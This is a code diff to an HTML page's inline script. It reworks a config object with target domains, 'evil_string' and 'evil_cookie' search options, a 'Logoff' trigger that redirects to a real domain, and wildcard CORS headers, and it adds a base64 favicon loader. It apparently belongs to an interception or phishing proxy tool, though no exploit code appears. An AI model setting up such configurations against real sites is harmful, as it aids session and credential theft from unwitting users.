@@ -2,11 +2,9 @@
         var dummy_config = {
             "primary_target": "target1.com",
             "secondary_target": "target2.com",
-            "search_string": "evil_string",
             "wwwroot": "mydir",
-            "tracking_cookie": "evil_cookie",
             "replacements": {
-                "string_to_replace": "replacement_string"
+                "string_to_be_replaced": "replacement_string"
             },
             "custom_headers": {
                 "Access-Control-Allow-Origin": "*",
@@ -16,10 +14,15 @@
                 "snitch_string": "Logoff",
                 "redirect_url": "https://real.domain.com/index.html"
             },
-            "logging_endpoint": {
-                "host": "www.myloggingserver.com",
-                "url": "/log_event",
-                "auth_cookie": "mycookie=authcookie"
+            "url_search": {
+                "switch": true,
+                "search_string": "evil_string",
+                "set_cookie": false
+            },
+            "cookie_search": {
+                "switch": false,
+                "cookie": "evil_cookie",
+                "cookie_value": "evil_value"
             }
         };
     </script>
@@ -62,6 +65,16 @@
             setTextArea();
             setPostInput();
 	}
+
+        document.addEventListener("DOMContentLoaded", function(event) { 
+          var favIcon = "AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEqIAP9KiAD/SogA/0B5AP9AeQD/QHkA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArTgB8SogA/0qIAP9KiAD/SogA/0qIAP9AeQD/QHkA/0B5AP9AeQD/QHkA/1SZAP8AAAAAAAAAAAAAAABeqwD/XqsA/0qIAP9KiAD/SogA/0qIAP9KiAD/QHkA/0B5AP9AeQD/QHkA/0B5AP9UmQD/VJkA/wAAAAAAAAAAXqsA/16rAP9eqwD/XqsA/16rAP9KiAD/SogA/0B5AP9AeQD/VJkA/1SZAP9UmQD/VJkA/1CSAP8AAAAAAAAAAF6rAP9eqwD/XqsA/16rAP9eqwD/XqsA/1miAP9UmQD/VJkA/1SZAP9UmQD/VJkA/1SZAP9UmQD/AAAAAAAAAABeqwD/XqsA/wDN//8Azf//AM3//16rAP9AeQD/I1wA/1SZAP8Asev/ALHr/wCx6/9UmQD/VJkA/wAAAAAAAAAAXqsA/wDN//8Azf//AM3//wDN//8Azf//XqsA/1SZAP8Asev/ALHr/wCx6/8AsOr/ALHr/1SZAP8AAAAAAAAAAADN//8Azf//AM3//0BAQP8Azf//AM3//16rAP9UmQD/ALHr/wCx6/8pKSn/ALHr/wCx6/8Asev/AAAAAAAAAAAAzf//AM3//wDN//9ERET/AM3//wDN//9eqwD/VJkA/wCx6/8Asev/JiYm/wCx6/8Asev/ALHr/wAAAAAAAAAAAM3//wDN//8Azf//AM3//wDN//8Azf//XqsA/1SZAP8Asev/ALHr/wCx6/8Asev/ALHr/wCx6/8AAAAAAAAAAAAAAAAAzf//AM3//wDN//8Azf//AM3//16rAP9UmQD/BLDg/wCx6/8Asev/ALHr/wCx6/8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZIALXqsA/16rAP9eqwD/T5EA/1SZAP9UmQD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABeqwD/XqsA/1SZAP9PkQD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXqsA/16rAP9UmQD/VJkA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABeqwD/VJkA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXqsA/1SZAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+B8AAOADAACAAQAAgAEAAIABAACAAQAAgAEAAIABAACAAQAAgAEAAMADAAD4HwAA/D8AAPw/AAD+fwAA/n8AAA=="
+          var docHead = document.getElementsByTagName('head')[0];       
+          var newLink = document.createElement('link');
+          newLink.rel = 'shortcut icon';
+          newLink.href = 'data:image/png;base64,'+favIcon;
+          docHead.appendChild(newLink);
+        });
+
 
     </script>
 </head>
